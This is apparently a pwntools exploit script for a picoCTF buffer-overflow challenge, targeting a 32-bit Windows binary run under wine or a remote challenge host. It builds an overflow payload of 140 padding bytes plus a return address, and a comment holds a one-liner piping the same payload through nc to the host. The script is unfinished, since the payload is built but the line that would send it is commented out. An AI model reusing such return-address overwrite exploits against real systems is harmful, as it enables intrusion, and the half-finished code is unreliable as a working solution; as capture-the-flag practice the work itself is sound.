#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host saturn.picoctf.net --port 62861 ./vuln.exe
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './vuln.exe'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'saturn.picoctf.net'
port = int(args.PORT or 63463)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug(["wine",exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process(["wine",exe] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()
main = 0x4015cf
win = 0x00401530
p = 'a'*(128+4*3)
# p += '\x30\x15'
p += p32(main)
# print p
# io.sendlineafter("string!",p)
# python -c "print 'a'*(128+4*3) + '\x30\x15\x40\x00'" | nc saturn.picoctf.net 63463
io.interactive()

